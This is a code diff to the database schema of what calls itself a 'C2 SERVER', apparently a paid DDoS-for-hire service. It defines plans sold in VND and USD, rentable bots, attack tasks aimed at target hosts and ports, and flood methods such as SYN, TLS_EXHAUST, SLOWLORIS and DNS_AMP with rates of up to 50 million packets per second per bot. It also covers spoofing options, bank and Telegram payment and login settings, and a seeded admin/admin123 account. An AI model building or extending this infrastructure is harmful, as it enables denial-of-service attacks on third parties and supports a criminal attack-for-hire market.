@@ -1,5 +1,6 @@
 -- ============================================================
--- C2 SERVER v4 — Full Schema (Plans, Payments, MB Bank, Telegram)
+-- C2 SERVER v4.0.49 — Full Schema
+-- Telegram auth, SiteSettings, Plan CRUD, FK CASCADE
 -- ============================================================
 
 CREATE TABLE users (
@@ -24,12 +25,12 @@ CREATE TABLE plans (
     description         TEXT,
     max_bots            INT NOT NULL DEFAULT 1,
     max_concurrent      INT NOT NULL DEFAULT 1,
-    max_attack_secs     INT NOT NULL DEFAULT 60,
+    max_attack_secs     INT NOT NULL DEFAULT 120,
     cooldown_secs       INT NOT NULL DEFAULT 300,
-    max_pps_per_bot     INT NOT NULL DEFAULT 100000,
-    allowed_methods     TEXT[] DEFAULT '{UDP,TCP}',
-    price_vnd           INT NOT NULL DEFAULT 50000,
-    price_usd           DECIMAL(10,2) NOT NULL DEFAULT 5.00,
+    max_pps_per_bot     INT NOT NULL DEFAULT 500000,
+    allowed_methods     TEXT[] DEFAULT '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,UDP}',
+    price_vnd           INT NOT NULL DEFAULT 10000,
+    price_usd           DECIMAL(10,2) NOT NULL DEFAULT 0.50,
     is_active           BOOLEAN DEFAULT TRUE,
     created_at          TIMESTAMPTZ DEFAULT NOW()
 );
@@ -49,10 +50,10 @@ CREATE TABLE user_subscriptions (
 -- ── Payments ───────────────────────────────────
 CREATE TABLE payments (
     id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    user_id         UUID REFERENCES users(id),
+    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
     amount_vnd      INT NOT NULL,
     amount_usd      DECIMAL(10,2),
-    method          VARCHAR(32) NOT NULL,  -- 'stripe' | 'mbank' | 'manual'
+    method          VARCHAR(32) NOT NULL,
     status          VARCHAR(16) DEFAULT 'pending',
     tx_ref          VARCHAR(128) UNIQUE,
     payment_url     TEXT,
@@ -75,12 +76,12 @@ CREATE TABLE bots (
     net_speed_mbps      INT,
     status              VARCHAR(16) DEFAULT 'offline',
     is_rented           BOOLEAN DEFAULT FALSE,
-    rented_by_user_id   UUID REFERENCES users(id),
+    rented_by_user_id   UUID REFERENCES users(id) ON DELETE SET NULL,
     rental_expires_at   TIMESTAMPTZ,
-    max_pps             INT DEFAULT 100000,
-    max_mbps            INT DEFAULT 500,
-    max_threads         INT DEFAULT 100,
-    enabled_methods     TEXT[] DEFAULT '{UDP,MEGA,SYN,TLS_EXHAUST,HTTP,SLOWLORIS,DNS_AMP}',
+    max_pps             INT DEFAULT 50000000,
+    max_mbps            INT DEFAULT 1000,
+    max_threads         INT DEFAULT 10000,
+    enabled_methods     TEXT[] DEFAULT '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,UDP}',
     spoof_mode          INT DEFAULT 0,
     fragmentation       BOOLEAN DEFAULT FALSE,
     last_heartbeat_at   TIMESTAMPTZ,
@@ -94,7 +95,7 @@ CREATE INDEX idx_bots_rented ON bots(is_rented) WHERE is_rented = TRUE;
 -- ── Attack Tasks ───────────────────────────────
 CREATE TABLE attack_tasks (
     id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    user_id         UUID REFERENCES users(id),
+    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
     target_host     VARCHAR(255) NOT NULL,
     target_port     INT NOT NULL,
     method          VARCHAR(16) NOT NULL,
@@ -104,8 +105,6 @@ CREATE TABLE attack_tasks (
     fragmentation   BOOLEAN DEFAULT FALSE,
     slowloris       BOOLEAN DEFAULT FALSE,
     tls_exhaust     BOOLEAN DEFAULT FALSE,
-    dns_amp         BOOLEAN DEFAULT FALSE,
-    game_mimic      BOOLEAN DEFAULT FALSE,
     mega_mode       BOOLEAN DEFAULT FALSE,
     status          VARCHAR(16) DEFAULT 'pending',
     bot_ids         UUID[] DEFAULT '{}',
@@ -118,21 +117,21 @@ CREATE TABLE attack_tasks (
 
 CREATE INDEX idx_tasks_status ON attack_tasks(status);
 
--- ── Attack Logs ────────────────────────────────
+-- ── Attack Logs (CASCADE on bot_id + task_id) ──
 CREATE TABLE attack_logs (
     id            BIGSERIAL PRIMARY KEY,
-    task_id       UUID REFERENCES attack_tasks(id),
-    bot_id        UUID REFERENCES bots(id),
+    task_id       UUID REFERENCES attack_tasks(id) ON DELETE CASCADE,
+    bot_id        UUID REFERENCES bots(id) ON DELETE CASCADE,
     packets_sent  BIGINT DEFAULT 0,
     bytes_sent    BIGINT DEFAULT 0,
     started_at    TIMESTAMPTZ,
-    ended_at      TIMESTAMPTZ
+    ended_at     TIMESTAMPTZ
 );
 
--- ── Admin Logs ─────────────────────────────────
+-- ── Admin Logs (SET NULL on admin delete) ─────
 CREATE TABLE admin_logs (
     id          BIGSERIAL PRIMARY KEY,
-    admin_id    UUID REFERENCES users(id),
+    admin_id    UUID REFERENCES users(id) ON DELETE SET NULL,
     action      VARCHAR(128) NOT NULL,
     target_type VARCHAR(64),
     target_id   UUID,
@@ -140,17 +139,34 @@ CREATE TABLE admin_logs (
     created_at  TIMESTAMPTZ DEFAULT NOW()
 );
 
--- ── Telegram Sessions ──────────────────────────
+-- ── Telegram Sessions (login_code + CASCADE) ──
 CREATE TABLE telegram_sessions (
-    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    user_id     UUID REFERENCES users(id) UNIQUE,
-    chat_id     BIGINT NOT NULL,
-    state       VARCHAR(32) DEFAULT 'idle',
-    data        JSONB DEFAULT '{}',
-    created_at  TIMESTAMPTZ DEFAULT NOW()
+    id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+    user_id             UUID REFERENCES users(id) ON DELETE CASCADE UNIQUE,
+    chat_id             BIGINT NOT NULL,
+    state               VARCHAR(32) DEFAULT 'idle',
+    data                JSONB DEFAULT '{}',
+    login_code          VARCHAR(32),
+    login_code_expires  TIMESTAMPTZ,
+    created_at          TIMESTAMPTZ DEFAULT NOW()
 );
 
--- ── MB Bank Sessions (persistent) ──────────────
+-- ── Site Settings (bank, site config) ─────────
+CREATE TABLE site_settings (
+    id                      INTEGER PRIMARY KEY DEFAULT 1,
+    site_name               VARCHAR(128) DEFAULT 'C2 Command Center',
+    site_url                VARCHAR(255) DEFAULT '',
+    telegram_bot_username   VARCHAR(64) DEFAULT '',
+    bank_account_name       VARCHAR(255) DEFAULT '',
+    bank_account_number     VARCHAR(32) DEFAULT '',
+    bank_name               VARCHAR(64) DEFAULT 'MBBank',
+    bank_bin                VARCHAR(16) DEFAULT '970422',
+    min_deposit             INT DEFAULT 10000,
+    maintenance_mode        BOOLEAN DEFAULT FALSE,
+    updated_at              TIMESTAMPTZ DEFAULT NOW()
+);
+
+-- ── MB Bank Sessions (persistent) ─────────────
 CREATE TABLE mb_sessions (
     id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
     device_id   VARCHAR(128) UNIQUE NOT NULL,
@@ -168,10 +184,15 @@ CREATE TABLE mb_sessions (
 
 -- Admin: admin / admin123
 INSERT INTO users (username, email, password_hash, role) VALUES
-('admin', 'admin@c2.local', '$2b$12$iw2ihlUINYafpVjXjgdujOijqGp4B9fPq7A5c97PPHr6jEx5N8C4G', 'admin');
+('admin', 'admin@c2.local', '$2b$12$iw2ihlUINYafpVjXjgdujOijqGp4B9fPq7A5c97PPHr6jEx5N8C4G', 'admin')
+ON CONFLICT DO NOTHING;
 
--- Plans
+-- Default site settings
+INSERT INTO site_settings (id) VALUES (1) ON CONFLICT DO NOTHING;
+
+-- Plans (updated methods, durations, pricing)
 INSERT INTO plans (name, slug, description, max_bots, max_concurrent, max_attack_secs, cooldown_secs, max_pps_per_bot, allowed_methods, price_vnd, price_usd) VALUES
-('Basic',     'basic',     'Dành cho người mới: 1 bot, 60s, UDP',                  1,  1,   60, 300, 100000,  '{UDP,MEGA}',                             50000,   5.00),
-('Pro',       'pro',       'Dành cho tester: 5 bot, 180s, đầy đủ method',           5,  3,  180, 120, 500000,  '{UDP,MEGA,SYN,HTTP}',                    150000, 15.00),
-('Enterprise','enterprise','Dành cho team: 20 bot, 600s, full method',              20, 10, 600,  30, 2000000, '{UDP,MEGA,SYN,TLS_EXHAUST,HTTP,SLOWLORIS,DNS_AMP}', 500000, 50.00);
+('Starter',    'starter',    '1 bot, 120s, cơ bản',           1,  1,  120, 300,  100000,  '{MEGA,TLS_EXHAUST,SLOWLORIS}',                              10000,  0.50),
+('Pro',        'pro',        '5 bot, 300s, đầy đủ method',     5,  3,  300, 120,  500000,  '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME}',         50000,  5.00),
+('Enterprise', 'enterprise', '20 bot, 600s, toàn bộ method',  20, 10, 600,  30, 2000000, '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,HTTP_PROXY,GAME,UDP}',     200000, 20.00)
+ON CONFLICT DO NOTHING;
